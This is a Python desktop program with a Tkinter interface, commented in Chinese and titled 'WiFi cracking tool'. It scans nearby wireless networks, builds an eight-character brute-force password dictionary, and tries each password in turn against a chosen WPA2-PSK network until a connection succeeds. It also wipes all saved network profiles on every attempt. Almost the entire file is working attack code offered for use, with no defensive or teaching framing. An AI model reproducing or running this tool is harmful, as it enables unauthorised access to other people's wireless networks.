from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import itertools
import os

class MY_GUI():
    def __init__(self, init_window_name):
        # tk窗口类
        self.init_window_name = init_window_name

        '''
        為窗口中可填內容設置占位符
        '''
        # 密碼字典構成元素表
        self.get_elements = StringVar()
        # 密碼文件路徑
        self.get_value = StringVar()
        # 獲取破解wifi帳號
        self.get_wifi_value = StringVar()
        # 獲取wifi密碼
        self.get_wifimm_value = StringVar()

        '''
        無線網卡初始化
        '''
        # 抓取網卡接口
        self.wifi = pywifi.PyWiFi()  
        # 抓取第一個無線網卡
        self.iface = self.wifi.interfaces()[0]  
        # 測試連結斷開所有連結
        self.iface.disconnect() 
        # 休眠1秒 
        time.sleep(1)  
        # 測試網卡是否屬於斷開狀態
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __str__(self):
        # 返回網卡設備信息
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    # 設置窗口
    def set_init_window(self):
        # 窗口名
        self.init_window_name.title("WIFI破解工具")
        # 窗口大小
        self.init_window_name.geometry('+500+200')

        labelframe = LabelFrame(width=400, height=200, text="配置")
        labelframe.grid(column=0, row=0, padx=10, pady=10)

        self.search = Button(labelframe, text="搜索附近WiFi", command=self.scans_wifi_list).grid(column=0, row=0)

        self.crack = Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0)

        self.generate = Button(labelframe, text="生成密碼字典", command=self.generatePassWords).grid(column=2, row=1)

        self.label1 = Label(labelframe, text="字典的構成元素").grid(column=0, row=1)

        self.elements = Entry(labelframe, width=12, textvariable=self.get_elements).grid(column=1, row=1)

        self.label2 = Label(labelframe, text="目錄路徑：").grid(column=0, row=2)

        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=2)

        self.file = Button(labelframe, text="添加密碼字典目錄", command=self.add_mm_file).grid(column=2, row=2)

        self.wifi_text = Label(labelframe, text="WiFi帳號：").grid(column=0, row=3)

        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=3)

        self.wifi_mm_text = Label(labelframe, text="WiFi密碼：").grid(column=2, row=3)

        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=3,sticky=W)

        self.wifi_labelframe = LabelFrame(text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=4, columnspan=4, sticky=NSEW)

        '''
        定義樹形結構與滾動條
        '''
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        '''
        表格的標題
        '''
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        # 修正：正确的双击事件绑定语法
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    # 掃描周圍wifi列表
    def scans_wifi_list(self):  
        # 開始掃描
        print("^_^ 掃描周圍wifi列表...")
        self.iface.scan()
        time.sleep(15)
        # 在若干秒後獲取掃描結果
        scanres = self.iface.scan_results()
        # 統計附近被發現的熱點數量
        nums = len(scanres)
        print("數量: %s" % (nums))
        # 實際數據
        self.show_scans_wifi_list(scanres)
        return scanres

    # 顯示wifi列表
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    # 添加密碼文件目錄
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview绑定事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])

    # 生成密碼字典
    def generatePassWords(self):
        passwdDictFileName = 'passwdDict.txt'
        with open(passwdDictFileName, 'w') as passwdDictFile:
            for passwd in itertools.product(self.get_elements.get(), repeat=8):
                passwdDictFile.write(''.join(passwd)+'\n')
        print('密碼字典已生成在了'+os.path.join(os.getcwd(), passwdDictFileName))

    # 讀取密碼字典，進行匹配
    def readPassWord(self):
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        self.pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = self.pwdfilehander.readline()
                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                if self.bool1:
                    self.res = "===正確===  wifi名:%s  匹配密碼：%s " % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功！！！')
                    print(self.res)
                    break
                else:
                    self.res = "---錯誤--- wifi名:%s匹配密碼：%s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                time.sleep(3)   # 修正：添加 time. 前缀
            except:
                continue

    # 對wifi和密碼進行匹配
    def connect(self, pwd_Str, wifi_ssid):
        # 創建wifi連結文件
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifi名稱
        self.profile.auth = const.AUTH_ALG_OPEN  # 網卡的開放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        self.profile.key = pwd_Str  # 密碼
        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 設定新的連結文件
        self.iface.connect(self.tmp_profile)  # 連結
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判斷是否連接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 斷開
        time.sleep(1)
        # 檢查斷開狀態
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

def gui_start():
    init_window = Tk()
    ui = MY_GUI(init_window)
    print(ui)
    ui.set_init_window()
    init_window.mainloop()

if __name__ == "__main__":
    gui_start()